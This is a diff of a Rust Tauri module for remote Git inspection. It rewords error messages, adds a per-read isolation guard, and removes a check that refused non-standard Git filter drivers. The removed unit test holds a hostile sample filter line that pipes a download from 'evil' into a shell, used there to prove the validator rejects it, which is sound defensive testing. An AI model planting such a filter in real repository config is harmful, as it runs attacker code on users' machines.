@@ -16,7 +16,7 @@ use std::{
 use tauri::{State, WebviewWindow};
 use tokio::sync::Semaphore;
 pub(super) fn failed() -> String {
-    "The host could not safely read this Studio item.".into()
+    "The other device couldn't safely read this Studio item.".into()
 }
 fn gate() -> Arc<Semaphore> {
     static GATE: OnceLock<Arc<Semaphore>> = OnceLock::new();
@@ -27,11 +27,12 @@ pub(super) async fn blocking<T: Send + 'static>(
 ) -> Result<T, String> {
     let permit = gate()
         .try_acquire_owned()
-        .map_err(|_| "The host is reading other Studio items. Try again shortly.".to_string())?;
+        .map_err(|_| "The other device is reading other Studio items. Try again shortly.".to_string())?;
     tokio::time::timeout(
         Duration::from_secs(20),
         tauri::async_runtime::spawn_blocking(move || {
             let _permit = permit;
+            let _read_policy=super::safe_git::enter();
             work()
         }),
     )
@@ -108,18 +109,6 @@ pub(super) fn git(
     }
     Ok((output.stdout, truncated))
 }
-/// Git LFS's own install writes exactly these four lines to the user's global
-/// config, so refusing them would turn remote Git off wherever LFS is installed.
-/// Only this exact text passes: any other filter, or any changed command, doesn't.
-fn only_standard_lfs(config: &str) -> bool {
-    const STANDARD: [&str; 4] = [
-        "filter.lfs.clean git-lfs clean -- %f",
-        "filter.lfs.smudge git-lfs smudge -- %f",
-        "filter.lfs.process git-lfs filter-process",
-        "filter.lfs.required true",
-    ];
-    config.lines().all(|line| STANDARD.contains(&line.trim_end()))
-}
 pub(super) fn git_root(read: &crate::project_git::GitReadOperation, root: &Anchor) -> Result<(), String> {
     let (bytes, truncated) = git(read, root, &["rev-parse", "--show-toplevel"], 8192)?;
     if truncated {
@@ -134,27 +123,9 @@ pub(super) fn git_root(read: &crate::project_git::GitReadOperation, root: &Ancho
     if actual.identity()? != root.identity()? {
         return Err("Open the repository's own root folder to inspect Git remotely.".into());
     }
-    // Status may run clean/process filters. Refuse configured filter drivers,
-    // rather than accidentally execute project/user-configured programs.
-    let args = [
-        "--literal-pathspecs",
-        "-c",
-        "core.fsmonitor=false",
-        "config",
-        "--get-regexp",
-        "^filter\\.",
-    ];
-    let (output, truncated) = read
-        .bounded_output(&root.git_cwd(), &args, 16384)
-        .map_err(|_| failed())?;
-    let harmless = output.status.code() == Some(1)
-        || output.status.success() && only_standard_lfs(&String::from_utf8_lossy(&output.stdout));
-    if truncated || !harmless {
-        return Err(
-            "Remote Git inspection is unavailable for repositories with configured file filters."
-                .into(),
-        );
-    }
+    // Every read is independently isolated from executable repository config;
+    // LFS and custom drivers are never executed, including under config races.
+
     root.validate()
 }
 fn status(
@@ -431,15 +402,4 @@ pub(crate) async fn remote_studio_file_preview(
         Ok(json!({"text":text,"binary":binary,"truncated":truncated}))
     })
     .await
-}
-
-#[cfg(test)]
-mod tests {
-    use super::only_standard_lfs;
-    #[test]
-    fn only_the_exact_lfs_install_counts_as_harmless() {
-        assert!(only_standard_lfs("filter.lfs.clean git-lfs clean -- %f\nfilter.lfs.smudge git-lfs smudge -- %f\nfilter.lfs.process git-lfs filter-process\nfilter.lfs.required true\n"));
-        assert!(!only_standard_lfs("filter.lfs.clean sh -c 'curl evil | sh'\n"));
-        assert!(!only_standard_lfs("filter.lfs.clean git-lfs clean -- %f\nfilter.x.clean ./run\n"));
-    }
 }
